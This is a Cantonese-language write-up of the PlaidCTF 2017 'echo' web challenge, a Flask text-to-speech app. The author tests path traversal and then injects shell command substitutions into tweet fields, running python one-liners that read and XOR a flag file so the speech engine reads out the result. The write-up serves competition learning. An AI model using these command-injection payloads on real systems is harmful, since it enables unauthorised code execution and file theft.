# PlaidCTF 2017: echo (Web, 200)

說明：
> If you hear enough, you may hear the whispers of a key... 
>
> If you see app.py well enough, you will notice the UI sucks... 
>
> http://echo.chal.pwning.xxx:9977/ 
>
> http://echo2.chal.pwning.xxx:9977/

## 簡介
一入去有張 form 可以填，叫你打 Tweets，每次最多打四條，每條最長 140 bytes。

求其打個 haha 之後就出左個 audio control，播佢真係會講 haha。所以點解條題目叫 echo

延伸閱讀: 如何測試 TTS - roflcopter.wav
> 其實只係係咁打 soi soi soi 

## 題解
首先我見到 `@app.route('/audio/<path:path>')` 會 return static file

例如 `/audio/(uuid)/1.wav` 就畀返個 1.wav 你。
如果你打 `/audio/asdf%2f..%2f(uuid)/1.wav` 佢都識畀返個 1.wav 你。
但係打 `/audio/..%2faudio/(uuid)/1.wav` 又唔得。

原來 Flask 個 send_from_directory 入面有個 safe_join ，佢 parse 一下之後一 check 到你 .. 開頭就 throw 鳩你。
[醬汁](https://github.com/pallets/flask/blob/f4a1ca8fc87bd28ad75502a78005226899e08a2a/flask/helpers.py#L654)

咁算囉。

之後我見到個 subprocess 個 docker 又斷 network 又剩搞到咁大陣象咁。

`"docker run -m=100M --cpu-period=100000 --cpu-quota=40000 --network=none -v {path}:/share lumjjb/echo_container:latest python run.py"`

然後成個 app.py 都冇一度有 TTS 既蹤影，咁好有可能個 TTS 係響個 docker 入面 run。同埋成個 app.py 都冇用到個 tweet data `{path}/input`，即係響個 docker 入面讀。

我響條 tweet 度求其打個 asdf\ 佢出 500. 打 asdf/ 或者 as\df 又冇事。佢重識讀個 Slash 添。

之後試下打 ${PATH} 。又唔見你讀 Dollar Path，剩係聽到一堆 Slash 啊 local 啊 bin 啊咁。讀太快聽唔切。

根據個 program logic 個 encoded flag 應該係放左響 `{path}/flag` 咁所以響 docker 入面就用 `/share/flag`。 佢將個 flag 每個 byte xor random bytes 64999 次然後將呢 64999 個 bytes 同埋個 output 寫落 `{path}/flag` 度。即係話只要將頭 65000 bytes xor 晒佢就會出 flag 第一個 byte，xor 晒 65001 至 130000 就出第二個字， 如此類推。

咁我就諗點樣用 140 個字寫段 code 黎讀一個字。因為佢每 run 一次個 docker 個 encoded flag 都唔同，所以你唔會 run 六萬五千次每次讀 1 byte 為左讀個 flag 1 byte (諗落都傻的嗎，你重要聽個 TTS 報數)。

---
首先我用 od 抽 d byte 出黎儲落個 array 度之後 xor 佢：
```
$(z=$(od -td1 -An /share/flag);x=($z);c=0;for i in `seq 0 64999`;do c=$(($c^${x[$i]}));done;echo $c)
```
run 佢竟然出 500。之後發現 `x=($z)` 呢句炒左。跛腳 sh 用唔到 Array。

之後求其 run od 65000 次啦：
```
$(c=0;for i in `seq 0 64999`;do z=$(od -d -An -N1 -j$i /share/flag);c=$(($c^$z));done;echo $c)
```
好明顯都係 500，應該係因為唔夠 ram。讀個大 file 六萬幾次。

唔知點算好之後睇返個 docker command 見到 `python run.py`，吊做乜唔用 python 用跛腳 sh。

試下個 file 有幾大先：
```
$(python -c "f=open('/share/flag').read();print len(f)")
```
Two million four hundred and seventy thousand，除返 65000 即係 38。個 flag 有 38 bytes。

之後郁佢啦：
```
$(python -c "q=65000;print reduce(lambda x,y:x^y,map(lambda x:ord(x),list(open('/share/flag').read())[0*q:1*q]))")
$(python -c "q=65000;print reduce(lambda x,y:x^y,map(lambda x:ord(x),list(open('/share/flag').read())[1*q:2*q]))")
...
$(python -c "q=65000;print reduce(lambda x,y:x^y,map(lambda x:ord(x),list(open('/share/flag').read())[36*q:37*q]))")
$(python -c "q=65000;print reduce(lambda x,y:x^y,map(lambda x:ord(x),list(open('/share/flag').read())[37*q:38*q]))")
```
每次貼四個都係 run 十次啫。

最後聽到係
> 80 67 84 70 123 76 49 53 115 116 51 110 95 84 48 95 95 114 101 101 101 95 114 101 101 101 101 101 101 95 114 101 101 101 95 108 97 125

所以個 flag 係 `"".join(map(lambda x:chr(int(x)),"80 67 84 70 123 76 49 53 115 116 51 110 95 84 48 95 95 114 101 101 101 95 114 101 101 101 101 101 101 95 114 101 101 101 95 108 97 125".split(" ")))`

PCTF{L15st3n_T0__reee_reeeeee_reee_la}

### 聽力測驗
我唔知點解將 114 115 116 聽左做 140 150 160。之後個 flag 梗係爛。個 95 我一度懷疑係 99。最後我用 hex double check
```
$(python -c "q=65000;print hex(reduce(lambda x,y:x^y,map(lambda x:ord(x),list(open('/share/flag').read())[8*q:9*q])))")
```
Zero X Seventy Three 即係 0x73 即係 115。

